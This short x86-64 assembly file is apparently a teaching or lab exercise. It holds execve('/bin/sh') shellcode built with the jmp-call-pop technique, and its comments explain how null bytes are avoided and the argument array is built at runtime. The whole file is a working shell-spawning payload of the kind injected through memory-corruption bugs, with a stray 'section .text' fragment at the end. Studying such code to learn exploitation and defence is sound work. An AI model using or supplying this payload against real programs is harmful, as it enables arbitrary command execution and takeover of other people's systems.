section .text
  global _start
    _start:
    BITS 64
    jmp short two
    one:
     pop rbx           

     mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
     xor rax, rax ; remove 0 in the rax register
     mov[rbx+7], al ; store 0 (second arg at the 8th place / bin / sh 0)
     mov [rbx+16], rax  ; store rax to memory at address rbx + 16

     mov rdi, rbx       ; rdi = rbx
     lea rsi, [rbx+8]   ; rsi = rbx + 8    
     xor rdx, rdx ; remove 0 in the rdx
     xor rax, rax
     mov al, 59 ; remove 0 then move 59 into the value
     syscall
     two:
        call one                                                                   
        db '/bin/sh', 0xFF ; The command string (terminated by a zero)
        db 'AAAAAAAA'      ; Place holder for argv[0] 
        db 'BBBBBBBB'      ; Place holder for argv[1]section .text
 
